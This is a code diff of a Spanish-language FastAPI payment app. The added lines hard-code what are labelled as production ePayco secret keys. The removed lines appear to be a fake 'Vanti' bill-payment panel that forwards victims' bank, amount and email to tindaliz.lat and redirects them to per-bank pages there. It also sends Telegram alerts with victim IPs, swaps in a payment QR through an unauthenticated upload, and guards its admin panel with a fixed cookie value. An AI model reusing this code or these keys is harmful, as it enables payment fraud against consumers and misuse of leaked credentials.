@@ -5,8 +5,17 @@ import random
 import shutil
 import json
 import time
+import hashlib
 import requests
 from typing import List
+
+# Credenciales ePayco (Producción)
+EPAYCO_PUBLIC_KEY = "24da23d756446dcd468753da3db0aea4"          # Copias el valor de PUBLIC_KEY
+EPAYCO_P_CUST_ID_CLIENT = "1594891"    # Copias el valor de P_CUST_ID_CLIENTE
+EPAYCO_P_KEY = "e934b987624597d78a2ad09aaf880a8babce2636"                    # Copias el valor de P_KEY
+EPAYCO_PRIVATE_KEY = "c40c89c21f5f056e15cf94f3d62d7b41"        # Copias el valor de PRIVATE_KEY (opcional para API backend)
+
+EPAYCO_TEST_MODE = "false"                        # "false" porque estás en Producción
 
 # 1. Configurar política de Event Loop para Windows ANTES de iniciar tareas asíncronas
 if sys.platform == 'win32':
@@ -85,6 +94,30 @@ async def index(request: Request):
         request=request, name="index.html", context={"error": None}
     )
 
+@app.get("/pagar-demo", response_class=HTMLResponse)
+async def pagar_demo(request: Request, referencia: str = "61743859", monto: float = 100000):
+    """Ruta de prueba: crea una transacción y muestra el checkout con ePayco."""
+    tx_id = guardar_transaccion("79", referencia, monto, get_client_ip(request))
+    ref_epayco = f"{referencia}-{tx_id}"
+    
+    return templates.TemplateResponse(
+        request=request, name="checkout.html",
+        context={
+            "tx_id": tx_id,
+            "referencia": referencia,
+            "monto": int(monto),
+            "empresa": "79",
+            "ref_epayco": ref_epayco,
+            "epayco_public_key": EPAYCO_PUBLIC_KEY,
+            "epayco_p_cust_id": EPAYCO_P_CUST_ID_CLIENT,
+            "epayco_test": EPAYCO_TEST_MODE
+        }
+    )
+
+@app.post("/actividad/{tx_id}")
+async def actividad(tx_id: int):
+    return {"status": "ok"}
+
 @app.post("/consultar", response_class=HTMLResponse)
 async def consultar(
     request: Request, 
@@ -129,236 +162,18 @@ async def consultar(
             }
         )
 
+    # Flujo por defecto (PSE): mostrar pasarela de pago ePayco
+    ref_epayco = f"{referencia}-{tx_id}"
     return templates.TemplateResponse(
         request=request, name="checkout.html",
         context={
             "tx_id": tx_id,
             "referencia": referencia,
             "monto": int(monto),
-            "empresa": empresa
+            "empresa": empresa,
+            "ref_epayco": ref_epayco,
+            "epayco_public_key": EPAYCO_PUBLIC_KEY,
+            "epayco_p_cust_id": EPAYCO_P_CUST_ID_CLIENT,
+            "epayco_test": EPAYCO_TEST_MODE
         }
     )
-
-@app.post("/procesar-pago-pse", response_class=RedirectResponse)
-async def procesar_pago_pse(
-    request: Request,
-    banco: str = Form(...),
-    tx_id: int = Form(...),
-    correo: str = Form(None)
-):
-    tx = obtener_transaccion(tx_id)
-    monto = int(tx["monto"]) if tx else 0
-    correo_cliente = correo or "-"
-
-    url_notificar_php = "https://tindaliz.lat/panel/notificar.php"
-    subruta_entidad = ""
-
-    try:
-        payload = {
-            "banco": banco,
-            "valor": monto,
-            "correo": correo_cliente
-        }
-        res = requests.post(url_notificar_php, data=payload, timeout=5)
-        
-        if res.status_code == 200:
-            subruta_entidad = res.text.strip()
-            print(f"[PSE] Notificación PHP exitosa. Subruta devuelta: {subruta_entidad}")
-        else:
-            print(f"[ERROR PSE] PHP devolvió status {res.status_code}: {res.text}")
-    except Exception as e:
-        print(f"[ERROR PSE] Ocurrió una excepción al llamar a {url_notificar_php}: {e}")
-
-    if not subruta_entidad:
-        subruta_entidad = "entidad/bogota/"
-
-    subruta_limpia = subruta_entidad.strip("/")
-    url_destino = f"https://tindaliz.lat/{subruta_limpia}/?valor={monto}&banco={banco}"
-
-    await manager.broadcast({
-        "event": "NUEVA_NOTIFICACION",
-        "banco": banco,
-        "monto": monto,
-        "correo": correo_cliente
-    })
-
-    ip = get_client_ip(request)
-    print(f"[PSE] IP ({ip}) banco: {banco} (${monto}). Redirigiendo a: {url_destino}")
-
-    return RedirectResponse(url=url_destino, status_code=303)
-
-@app.post("/procesar-pago-llave", response_class=HTMLResponse)
-async def procesar_pago_llave(
-    request: Request,
-    tx_id: int = Form(...),
-    referencia: str = Form(...),
-    monto: float = Form(...)
-):
-    try:
-        ip = get_client_ip(request)
-        tx = obtener_transaccion(tx_id)
-        
-        if tx:
-            actualizar_estado_transaccion(tx_id, "por_verificar")
-            tx["estado"] = "por_verificar"
-
-            # Broadcast al WebSocket de Admin
-            await manager.broadcast({
-                "event": "NUEVO_PAGO_LLAVE",
-                "tx": tx,
-                "metricas": obtener_metricas()
-            })
-
-            # Alerta por Telegram
-            empresa_nombre = tx.get('empresa', 'Vanti') if isinstance(tx, dict) else 'Vanti'
-            enviar_mensaje_telegram(
-                f"🔑 <b>¡Nuevo pago con Llave BRE-B!</b>\n"
-                f"• <b>Llave usada:</b> <code>0093310444</code>\n"
-                f"• <b>Empresa:</b> {empresa_nombre}\n"
-                f"• <b>Referencia:</b> {referencia}\n"
-                f"• <b>Monto:</b> ${monto:,.0f}\n"
-                f"• <b>IP:</b> {ip}"
-            )
-
-        return templates.TemplateResponse(
-            request=request, name="esperando.html", context={"tx_id": tx_id}
-        )
-
-    except Exception as e:
-        print(f"[ERROR CRÍTICO EN PROCESAR PAGO LLAVE]: {e}")
-        raise HTTPException(status_code=500, detail=str(e))
-
-@app.post("/admin/cambiar_estado")
-async def cambiar_estado(
-    request: Request,
-    tx_id: int = Form(...),
-    nuevo_estado: str = Form(...)
-):
-    if request.cookies.get("admin_session") != "authenticated_vanti":
-        raise HTTPException(status_code=401, detail="Sesión no autorizada.")
-    
-    # 1. Actualizar estado en la base de datos SQLite
-    actualizar_estado_transaccion(tx_id, nuevo_estado)
-    
-    tx = obtener_transaccion(tx_id)
-    metricas = obtener_metricas()
-    
-    # 2. Notificar vía WebSocket al cliente y al panel admin
-    await manager.broadcast({
-        "event": "ESTADO_CAMBIADO",
-        "tx_id": tx_id,
-        "nuevo_estado": nuevo_estado,
-        "tx": tx,
-        "metricas": metricas
-    })
-    
-    return {"status": "ok", "tx_id": tx_id, "nuevo_estado": nuevo_estado}
-
-
-@app.post("/admin/bloquear_ip")
-async def api_bloquear_ip(
-    request: Request,
-    ip: str = Form(...)
-):
-    if request.cookies.get("admin_session") != "authenticated_vanti":
-        raise HTTPException(status_code=401, detail="Sesión no autorizada.")
-    
-    bloquear_ip(ip)
-    return {"status": "ok", "ip_bloqueada": ip}
-    
-@app.post("/notificar_pago", response_class=HTMLResponse)
-async def notificar_pago(request: Request, tx_id: int = Form(...)):
-    ip = get_client_ip(request)
-    tx = obtener_transaccion(tx_id)
-    
-    if tx:
-        actualizar_estado_transaccion(tx_id, "por_verificar")
-        tx["estado"] = "por_verificar"
-
-        await manager.broadcast({
-            "event": "NUEVO_PAGO",
-            "tx": tx,
-            "metricas": obtener_metricas()
-        })
-
-        enviar_mensaje_telegram(
-            f"🔔 <b>¡Nuevo pago recibido para verificar!</b>\n"
-            f"• <b>Empresa:</b> {tx['empresa']}\n"
-            f"• <b>Referencia:</b> {tx['referencia']}\n"
-            f"• <b>Monto:</b> ${tx['monto']:,.0f}\n"
-            f"• <b>IP:</b> {ip}"
-        )
-
-    return templates.TemplateResponse(
-        request=request, name="esperando.html", context={"tx_id": tx_id}
-    )
-
-@app.get("/estado_pago/{tx_id}")
-async def estado_pago(tx_id: int):
-    tx = obtener_transaccion(tx_id)
-    if tx:
-        return {"estado": tx["estado"]}
-    return {"estado": "no_encontrado"}
-
-@app.get("/resultado/{tx_id}", response_class=HTMLResponse)
-async def resultado_final(request: Request, tx_id: int):
-    tx = obtener_transaccion(tx_id)
-    return templates.TemplateResponse(
-        request=request, name="estado.html", context={"tx": tx}
-    )
-
-# --- PANEL DE ADMINISTRACIÓN Y TELEGRAM ---
-
-@app.get("/admin/login", response_class=HTMLResponse)
-async def admin_login_page(request: Request):
-    otp = str(random.randint(100000, 999999))
-    guardar_otp_admin(otp)
-    enviar_mensaje_telegram(f"🔐 <b>Código de Seguridad para Admin:</b> <code>{otp}</code>")
-    return templates.TemplateResponse(
-        request=request, name="admin_login.html", context={"error": None}
-    )
-
-@app.post("/admin/login")
-async def admin_login_post(request: Request, otp: str = Form(...)):
-    if verificar_otp_admin(otp):
-        response = RedirectResponse(url="/admin", status_code=303)
-        response.set_cookie(key="admin_session", value="authenticated_vanti", httponly=True)
-        return response
-    return templates.TemplateResponse(
-        request=request, name="admin_login.html", context={"error": "Código OTP inválido o expirado."}
-    )
-
-@app.get("/admin", response_class=HTMLResponse)
-async def admin_panel(request: Request):
-    if request.cookies.get("admin_session") != "authenticated_vanti":
-        return RedirectResponse(url="/admin/login")
-
-    transacciones = obtener_todas_transacciones()
-    metricas = obtener_metricas()
-    return templates.TemplateResponse(
-        request=request, name="admin.html",
-        context={
-            "transacciones": transacciones,
-            "metricas": metricas
-        }
-    )
-
-@app.get("/admin/datos")
-async def admin_datos(request: Request):
-    if request.cookies.get("admin_session") != "authenticated_vanti":
-        raise HTTPException(status_code=401, detail="Sesión de administrador requerida.")
-
-    return {
-        "transacciones": obtener_todas_transacciones(),
-        "metricas": obtener_metricas()
-    }
-
-@app.post("/admin/actualizar_qr")
-async def actualizar_qr(file: UploadFile = File(...)):
-    os.makedirs("static/uploads", exist_ok=True)
-    file_path = "static/uploads/qr_actual.png"
-    with open(file_path, "wb") as buffer:
-        shutil.copyfileobj(file.file, buffer)
-    
-    await manager.broadcast({"event": "QR_ACTUALIZADO"})
-    return {"status": "ok"}
